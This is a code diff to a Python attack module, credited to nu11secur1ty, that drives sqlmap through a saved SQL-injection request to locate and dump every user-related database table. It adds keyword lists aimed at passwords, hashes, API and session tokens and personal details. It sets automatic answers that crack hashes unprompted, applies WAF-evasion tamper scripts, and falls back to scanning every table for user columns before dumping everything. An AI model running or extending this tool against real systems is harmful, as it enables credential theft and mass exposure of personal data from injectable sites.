@@ -44,6 +44,48 @@ SQLMAP_DEFAULT_PATHS = [
 ]
 
 # ============================================================================
+# CORE USER TABLE KEYWORDS - ONLY THE MOST COMMON
+# ============================================================================
+
+USER_TABLE_KEYWORDS = [
+    'user', 'users', 'admin', 'admins', 'member', 'members',
+    'login', 'logins', 'account', 'accounts', 'profile', 'profiles',
+    'customer', 'customers', 'employee', 'employees', 'staff',
+    'auth', 'credentials', 'sessions', 'tokens',
+    'role', 'roles', 'permission', 'permissions',
+    'wp_users', 'drupal_users', 'joomla_users',
+    'admin_users', 'password_reset', 'social_users',
+    'usuario', 'usuarios', 'utilisateur', 'benutzer'
+]
+
+# ============================================================================
+# CORE USER COLUMN KEYWORDS - ONLY THE MOST COMMON
+# ============================================================================
+
+USER_COLUMN_KEYWORDS = [
+    'user', 'username', 'email', 'password', 'pass', 'login',
+    'name', 'fullname', 'first_name', 'last_name', 'phone',
+    'mobile', 'address', 'role', 'admin', 'member', 'profile',
+    'user_id', 'uid', 'account',
+    'user_name', 'nickname', 'display_name', 'user_login',
+    'user_email', 'user_pass', 'user_password', 'userid',
+    'passwd', 'pwd', 'user_meta', 'user_profile', 'user_roles',
+    'auth_token', 'api_token', 'session_id', 'remember_token',
+    'password_hash', 'password_salt', 'password_reset',
+    'firstname', 'lastname', 'gender', 'country', 'state', 'city',
+    'phone_number', 'mobile_number', 'email_address',
+    'facebook_id', 'google_id', 'github_id',
+    'company', 'department', 'position', 'title',
+    'created_at', 'updated_at', 'last_login',
+    'is_active', 'is_admin', 'is_verified', 'is_banned',
+    'meta_key', 'meta_value', 'user_settings',
+    'usuario', 'usuarios', 'utilisateur', 'benutzer'
+]
+
+# SQLMAP ANSWERS - automatically answers all questions
+SQLMAP_ANSWERS = "continue=Y,quit=N,proceed=Y,crack=Y,dict=Y,resolve=Y,follow=Y,test=Y"
+
+# ============================================================================
 # FUNCTIONS
 # ============================================================================
 
@@ -51,9 +93,9 @@ def display_banner():
     """Display module banner"""
     print(Fore.CYAN + """
 ╔═══════════════════════════════════════════════════════════════╗
-║                    👥 USERS DUMP MODULE                      ║
-║           Find and dump ALL user tables in database          ║
-║                   Author: nu11secur1ty                       ║
+║                    👥 USERS DUMP MODULE                       ║
+║      SCANS FOR ANY TABLE WITH USER DATA                       ║
+║                   Author: nu11secur1ty                        ║
 ╚═══════════════════════════════════════════════════════════════╝
 """ + Style.RESET_ALL)
 
@@ -92,37 +134,20 @@ def load_exploit():
         print(Fore.RED + f"❌ Error loading exploit: {e}" + Style.RESET_ALL)
         return None, None
 
-def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
+def run_sqlmap_command(cmd, description=""):
     """
-    Step 1: Find ALL tables that contain 'user' in the name
-    - Shows original sqlmap output with colors
+    Run sqlmap command with proper batch mode and answers
     """
-    print(Fore.CYAN + "\n[+] Searching for ALL user tables..." + Style.RESET_ALL)
+    if description:
+        print(Fore.CYAN + f"\n[+] {description}" + Style.RESET_ALL)
     
-    # Build command to find user tables
-    if sqlmap_path.endswith(".py"):
-        cmd = [sys.executable, sqlmap_path]
-    else:
-        cmd = [sqlmap_path]
+    # Add batch and answers if not already present
+    if "--batch" not in cmd:
+        cmd.append("--batch")
+    if "--answers" not in cmd:
+        cmd.append("--answers=" + SQLMAP_ANSWERS)
     
-    cmd += [
-        "-r", str(exploit_path),
-        "--batch",
-        "--flush-session",
-        "--dbms=mysql",
-        "--random-agent",
-        "--level=5",
-        "--risk=3",
-        "--time-sec=11",
-        "--tamper=space2comment,between,charencode",
-        "--sql-query=SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND (TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%admin%' OR TABLE_NAME LIKE '%member%' OR TABLE_NAME LIKE '%login%' OR TABLE_NAME LIKE '%account%' OR TABLE_NAME LIKE '%profile%')",
-    ]
-    
-    if vuln_params:
-        cmd += ["-p", ",".join(vuln_params)]
-    
-    print(Fore.YELLOW + "[*] Finding tables containing: user, admin, member, login, account, profile" + Style.RESET_ALL)
-    print(Fore.YELLOW + "[!] This may take a moment..." + Style.RESET_ALL)
+    print(Fore.YELLOW + "[*] Running sqlmap..." + Style.RESET_ALL)
     print("-" * 60)
     
     try:
@@ -134,44 +159,21 @@ def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
         capture_result = subprocess.run(cmd_capture, capture_output=True, text=True, check=False)
         output = capture_result.stdout + capture_result.stderr
         
-        # Extract table names from output
-        tables = []
-        patterns = [
-            r'Table: (\w+)',
-            r'\|\s*(\w+)\s*\|',
-            r'\[(\w+)\]',
-            r'(\w+)\s+\([0-9]+ rows\)'
-        ]
+        return output
         
-        for pattern in patterns:
-            matches = re.findall(pattern, output)
-            for match in matches:
-                if any(keyword in match.lower() for keyword in ['user', 'admin', 'member', 'login', 'account', 'profile']):
-                    if match not in tables and len(match) > 2:
-                        tables.append(match)
-        
-        tables = sorted(set(tables))
-        
-        if tables:
-            print(Fore.GREEN + f"\n[+] Found {len(tables)} user-related tables:" + Style.RESET_ALL)
-            for i, table in enumerate(tables, 1):
-                print(Fore.CYAN + f"    {i}. {table}" + Style.RESET_ALL)
-            return tables
-        else:
-            print(Fore.YELLOW + "\n[!] No user tables found. Using common table names..." + Style.RESET_ALL)
-            return ["users", "user", "admin", "members", "login", "accounts", "profiles", "user_accounts", "user_profiles"]
-            
     except Exception as e:
-        print(Fore.RED + f"❌ Error finding tables: {e}" + Style.RESET_ALL)
-        return ["users", "user", "admin", "members", "login", "accounts"]
+        print(Fore.RED + f"❌ Error: {e}" + Style.RESET_ALL)
+        return ""
 
-def dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table_name):
+def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
     """
-    Step 2: Dump users from a specific table
-    - Shows original sqlmap output with colors
-    - sqlmap automatically saves to its output directory
+    Step 1: Find ALL tables that MIGHT contain user data
     """
-    print(Fore.CYAN + f"\n[+] Dumping users from table: {table_name}" + Style.RESET_ALL)
+    print(Fore.CYAN + "\n[+] Scanning for ALL user-related tables..." + Style.RESET_ALL)
+    
+    # Build SQL query to find ANY table with user-related name
+    table_keywords_pattern = " OR ".join([f"TABLE_NAME LIKE '%{kw}%'" for kw in USER_TABLE_KEYWORDS])
+    sql_query = f"SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND ({table_keywords_pattern})"
     
     if sqlmap_path.endswith(".py"):
         cmd = [sys.executable, sqlmap_path]
@@ -180,7 +182,6 @@ def dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table_name):
     
     cmd += [
         "-r", str(exploit_path),
-        "--batch",
         "--flush-session",
         "--dbms=mysql",
         "--random-agent",
@@ -188,28 +189,238 @@ def dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table_name):
         "--risk=3",
         "--time-sec=11",
         "--tamper=space2comment,between,charencode",
-        "--dump",
-        f"-T {table_name}",
-        "--threads=10",
-        "--timeout=30",
-        "--retries=3",
-        "--answers=crack=Y,dict=Y,continue=Y,quit=N",
+        "--no-cast",
+        "--no-escape",
+        "--sql-query=" + sql_query,
     ]
     
     if vuln_params:
         cmd += ["-p", ",".join(vuln_params)]
     
-    print(Fore.YELLOW + f"[*] Dumping ALL users from {table_name}..." + Style.RESET_ALL)
+    print(Fore.YELLOW + "[*] Looking for tables containing: " + ", ".join(USER_TABLE_KEYWORDS[:10]) + "..." + Style.RESET_ALL)
+    print(Fore.YELLOW + "[!] This may take a moment..." + Style.RESET_ALL)
+    print("-" * 60)
+    
+    output = run_sqlmap_command(cmd)
+    
+    if not output:
+        return []
+    
+    # Extract table names from output
+    tables = []
+    patterns = [
+        r'Table: (\w+)',
+        r'\|\s*(\w+)\s*\|',
+        r'\[(\w+)\]',
+        r'(\w+)\s+\([0-9]+ rows\)'
+    ]
+    
+    for pattern in patterns:
+        matches = re.findall(pattern, output)
+        for match in matches:
+            if match and len(match) > 2 and not match.isdigit():
+                match_lower = match.lower()
+                if any(kw in match_lower for kw in USER_TABLE_KEYWORDS):
+                    if match not in tables:
+                        tables.append(match)
+    
+    tables = sorted(set(tables))
+    
+    if tables:
+        print(Fore.GREEN + f"\n[+] Found {len(tables)} potential user tables:" + Style.RESET_ALL)
+        for i, table in enumerate(tables, 1):
+            print(Fore.CYAN + f"    {i}. {table}" + Style.RESET_ALL)
+        return tables
+    else:
+        print(Fore.YELLOW + "\n[!] No user tables found by name. Trying to find tables with user columns..." + Style.RESET_ALL)
+        return []
+
+def find_all_tables_by_columns(sqlmap_path, exploit_path, vuln_params):
+    """
+    Step 2: Find tables that contain user-related COLUMNS
+    """
+    print(Fore.CYAN + "\n[+] Searching for tables with user-related COLUMNS..." + Style.RESET_ALL)
+    
+    # Build SQL query to find tables with user-related columns
+    column_keywords_pattern = " OR ".join([f"COLUMN_NAME LIKE '%{kw}%'" for kw in USER_COLUMN_KEYWORDS])
+    sql_query = f"SELECT DISTINCT TABLE_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database() AND ({column_keywords_pattern})"
+    
+    if sqlmap_path.endswith(".py"):
+        cmd = [sys.executable, sqlmap_path]
+    else:
+        cmd = [sqlmap_path]
+    
+    cmd += [
+        "-r", str(exploit_path),
+        "--flush-session",
+        "--dbms=mysql",
+        "--random-agent",
+        "--level=5",
+        "--risk=3",
+        "--time-sec=11",
+        "--tamper=space2comment,between,charencode",
+        "--no-cast",
+        "--no-escape",
+        "--sql-query=" + sql_query,
+    ]
+    
+    if vuln_params:
+        cmd += ["-p", ",".join(vuln_params)]
+    
+    print(Fore.YELLOW + "[*] Looking for columns containing: " + ", ".join(USER_COLUMN_KEYWORDS[:10]) + "..." + Style.RESET_ALL)
+    print(Fore.YELLOW + "[!] This may take a moment..." + Style.RESET_ALL)
+    print("-" * 60)
+    
+    output = run_sqlmap_command(cmd)
+    
+    if not output:
+        return []
+    
+    # Extract table names from output
+    tables = []
+    patterns = [
+        r'Table: (\w+)',
+        r'\|\s*(\w+)\s*\|',
+        r'\[(\w+)\]',
+        r'TABLE_NAME: (\w+)',
+        r'(\w+)\s+\([0-9]+ rows\)'
+    ]
+    
+    for pattern in patterns:
+        matches = re.findall(pattern, output)
+        for match in matches:
+            if match and len(match) > 2 and not match.isdigit():
+                if match not in tables:
+                    tables.append(match)
+    
+    tables = sorted(set(tables))
+    
+    if tables:
+        print(Fore.GREEN + f"\n[+] Found {len(tables)} tables with user columns:" + Style.RESET_ALL)
+        for i, table in enumerate(tables, 1):
+            print(Fore.CYAN + f"    {i}. {table}" + Style.RESET_ALL)
+        return tables
+    else:
+        print(Fore.YELLOW + "\n[!] No tables with user columns found." + Style.RESET_ALL)
+        return []
+
+def get_table_columns(sqlmap_path, exploit_path, vuln_params, table_name):
+    """
+    Get all columns from a specific table
+    """
+    print(Fore.CYAN + f"[*] Getting columns from: {table_name}" + Style.RESET_ALL)
+    
+    if sqlmap_path.endswith(".py"):
+        cmd = [sys.executable, sqlmap_path]
+    else:
+        cmd = [sqlmap_path]
+    
+    cmd += [
+        "-r", str(exploit_path),
+        "--flush-session",
+        "--dbms=mysql",
+        "--random-agent",
+        "--level=5",
+        "--risk=3",
+        "--time-sec=11",
+        "--tamper=space2comment,between,charencode",
+        "--no-cast",
+        "--no-escape",
+        "--sql-query=SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='" + table_name + "'",
+    ]
+    
+    if vuln_params:
+        cmd += ["-p", ",".join(vuln_params)]
+    
+    output = run_sqlmap_command(cmd)
+    
+    if not output:
+        return []
+    
+    # Extract column names
+    columns = []
+    patterns = [
+        r'Column: (\w+)',
+        r'\|\s*(\w+)\s*\|',
+        r'\[(\w+)\]'
+    ]
+    
+    for pattern in patterns:
+        matches = re.findall(pattern, output)
+        for match in matches:
+            if match and len(match) > 1 and not match.isdigit():
+                if match not in columns:
+                    columns.append(match)
+    
+    return columns
+
+def check_table_for_user_columns(sqlmap_path, exploit_path, vuln_params, table_name):
+    """
+    Check if a table has user-related columns
+    """
+    columns = get_table_columns(sqlmap_path, exploit_path, vuln_params, table_name)
+    
+    if not columns:
+        return []
+    
+    user_columns = []
+    for col in columns:
+        col_lower = col.lower()
+        if any(keyword in col_lower for keyword in USER_COLUMN_KEYWORDS):
+            user_columns.append(col)
+    
+    if user_columns:
+        print(Fore.GREEN + f"    [+] Found user columns: {', '.join(user_columns)}" + Style.RESET_ALL)
+        return user_columns
+    else:
+        return []
+
+def dump_table(sqlmap_path, exploit_path, vuln_params, table_name):
+    """
+    Dump ALL data from a table
+    """
+    print(Fore.CYAN + f"\n[+] Dumping ALL data from table: {table_name}" + Style.RESET_ALL)
+    
+    if sqlmap_path.endswith(".py"):
+        cmd = [sys.executable, sqlmap_path]
+    else:
+        cmd = [sqlmap_path]
+    
+    cmd += [
+        "-r", str(exploit_path),
+        "--flush-session",
+        "--dbms=mysql",
+        "--random-agent",
+        "--level=5",
+        "--risk=3",
+        "--time-sec=11",
+        "--tamper=space2comment,between,charencode",
+        "--no-cast",
+        "--no-escape",
+        "--dump",
+        f"-T {table_name}",
+        "--threads=10",
+        "--timeout=30",
+        "--retries=3",
+    ]
+    
+    if vuln_params:
+        cmd += ["-p", ",".join(vuln_params)]
+    
+    print(Fore.YELLOW + f"[*] Dumping {table_name}..." + Style.RESET_ALL)
     print(Fore.YELLOW + "[!] Press Ctrl+C to skip this table" + Style.RESET_ALL)
     print("-" * 60)
     
     try:
-        # Run sqlmap directly - PRESERVES COLORS
-        # sqlmap automatically saves results to its output directory
+        # Run sqlmap with batch and answers
+        if "--batch" not in cmd:
+            cmd.append("--batch")
+        if "--answers" not in cmd:
+            cmd.append("--answers=" + SQLMAP_ANSWERS)
+        
         result = subprocess.run(cmd, check=False)
         
         print(Fore.GREEN + f"\n[+] Completed dumping {table_name}" + Style.RESET_ALL)
-        print(Fore.YELLOW + f"[*] SQLmap saved results in its default output directory" + Style.RESET_ALL)
         return True
             
     except KeyboardInterrupt:
@@ -219,8 +430,58 @@ def dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table_name):
         print(Fore.RED + f"❌ Error dumping {table_name}: {e}" + Style.RESET_ALL)
         return False
 
+def get_all_tables(sqlmap_path, exploit_path, vuln_params):
+    """
+    Get ALL tables from the database
+    """
+    print(Fore.CYAN + "\n[+] Getting ALL tables from database..." + Style.RESET_ALL)
+    
+    if sqlmap_path.endswith(".py"):
+        cmd = [sys.executable, sqlmap_path]
+    else:
+        cmd = [sqlmap_path]
+    
+    cmd += [
+        "-r", str(exploit_path),
+        "--flush-session",
+        "--dbms=mysql",
+        "--random-agent",
+        "--level=5",
+        "--risk=3",
+        "--time-sec=11",
+        "--tamper=space2comment,between,charencode",
+        "--no-cast",
+        "--no-escape",
+        "--sql-query=SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database()",
+    ]
+    
+    if vuln_params:
+        cmd += ["-p", ",".join(vuln_params)]
+    
+    output = run_sqlmap_command(cmd)
+    
+    if not output:
+        return []
+    
+    tables = []
+    patterns = [
+        r'Table: (\w+)',
+        r'\|\s*(\w+)\s*\|',
+        r'\[(\w+)\]',
+        r'(\w+)\s+\([0-9]+ rows\)'
+    ]
+    
+    for pattern in patterns:
+        matches = re.findall(pattern, output)
+        for match in matches:
+            if match and len(match) > 2 and not match.isdigit():
+                if match not in tables:
+                    tables.append(match)
+    
+    return sorted(set(tables))
+
 def run_users_dump():
-    """Main function - find and dump all user tables"""
+    """Main function - find and dump ALL user tables"""
     display_banner()
     
     # Check if exploit exists
@@ -253,17 +514,37 @@ def run_users_dump():
     print()
     
     # Confirm
-    confirm = input(Fore.YELLOW + "Start FULL users dump? [Y/n]: " + Style.RESET_ALL).strip().lower()
+    confirm = input(Fore.YELLOW + "Start DEEP users scan and dump? [Y/n]: " + Style.RESET_ALL).strip().lower()
     if confirm not in ("", "y", "yes"):
         print(Fore.YELLOW + "Cancelled." + Style.RESET_ALL)
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # STEP 1: Find all user tables
+    # STEP 1: Find tables by name (user, admin, etc.)
     user_tables = find_all_user_tables(sqlmap_path, exploit_path, vuln_params)
     
+    # STEP 2: If no tables found by name, find by columns
     if not user_tables:
-        print(Fore.RED + "❌ No user tables found!" + Style.RESET_ALL)
+        user_tables = find_all_tables_by_columns(sqlmap_path, exploit_path, vuln_params)
+    
+    # STEP 3: If still no tables found, get ALL tables and check each
+    if not user_tables:
+        print(Fore.YELLOW + "\n[!] No user tables found by name or columns. Getting ALL tables..." + Style.RESET_ALL)
+        
+        all_tables = get_all_tables(sqlmap_path, exploit_path, vuln_params)
+        
+        if all_tables:
+            print(Fore.CYAN + f"\n[+] Found {len(all_tables)} total tables. Checking each for user columns..." + Style.RESET_ALL)
+            print("="*60)
+            
+            for table in all_tables:
+                user_columns = check_table_for_user_columns(sqlmap_path, exploit_path, vuln_params, table)
+                if user_columns:
+                    user_tables.append(table)
+    
+    if not user_tables:
+        print(Fore.YELLOW + "\n[!] No tables with user data found!" + Style.RESET_ALL)
+        print(Fore.YELLOW + "[!] The database may not contain user tables." + Style.RESET_ALL)
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
@@ -298,7 +579,7 @@ def run_users_dump():
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # STEP 2: Dump users from each selected table
+    # Dump selected tables
     print(Fore.CYAN + "\n" + "="*60)
     print(f"DUMPING {len(tables_to_dump)} USER TABLES")
     print("="*60 + Style.RESET_ALL)
@@ -311,7 +592,7 @@ def run_users_dump():
         print(Fore.CYAN + f"\n[{i}/{len(tables_to_dump)}] Processing: {table}" + Style.RESET_ALL)
         print(Fore.CYAN + "="*60 + Style.RESET_ALL)
         
-        if dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table):
+        if dump_table(sqlmap_path, exploit_path, vuln_params, table):
             success_count += 1
     
     # Summary
